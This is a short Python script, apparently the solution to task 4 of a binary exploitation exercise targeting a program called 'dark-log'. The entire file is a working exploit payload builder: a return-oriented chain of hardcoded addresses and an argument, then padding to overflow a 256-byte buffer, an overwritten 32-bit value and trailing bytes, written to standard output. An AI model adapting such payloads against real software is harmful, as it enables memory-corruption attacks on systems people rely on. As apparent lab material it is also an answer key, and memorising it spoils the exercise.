#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log."""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

chain  = p64(0x401526)    
chain += p64(0x4018a3)    
chain += p64(4)           
chain += p64(0x401677)    

payload  = chain + b"C" * (256 - len(chain))   
payload += p32(0xa8)                            
payload += b"D" * 19                            

sys.stdout.buffer.write(payload)
